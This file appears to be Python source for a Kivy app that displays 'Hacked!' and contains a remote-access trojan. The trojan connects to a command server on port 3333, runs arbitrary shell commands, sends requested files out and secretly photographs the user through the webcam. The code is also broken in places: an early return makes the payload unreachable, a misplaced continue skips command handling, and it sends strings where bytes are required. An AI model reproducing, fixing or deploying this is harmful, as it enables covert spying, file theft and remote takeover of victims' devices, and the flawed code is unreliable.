from kivy.app import App
from kivy.lang import Builder
from kivy.uix.label import Label
import socket
import subprocess
import sys
import cv2
import os

class MyMainApp(App):
  def build(self):
    return Label(text="Hacked!")
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 3333
    BUFFER_SIZE = 4096

    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))

    message = s.recv(BUFFER_SIZE).decode()

    def webcam():
      c = cv2.VideoCapture(0)
      return_value, image = c.read()
      cv2.imwrite("camera.png", image)
      del(c)
      s.send("webcam")
      f = open("camera.png", "rb")
      i = f.read(4096)
      while i != "":
        s.send(i)
        i = f.read()
      f.close()
      s.send("[*] Snap was succesfully made!\n")
      os.remove("camera.png")

    def upload():
      filename = s.recv(4096)
      f = open(filename, "rb")
      i = f.read(4096)
      while(i):
        s.send(i)
        i = f.read(4096)
      f.close()
      s.send("[*] Complete!")

    while True:
      command = s.recv(BUFFER_SIZE).decode()
      if str(command) == "download":
        upload()
        continue
      if str(command) == "webcamsnap":
        webcam()
      continue
      if command.lower() == "exit":
        break
      output = subprocess.getoutput(command)
      s.send(output.encode())
    s.close()


if __name__ == "__main__":
  MyMainApp().run()
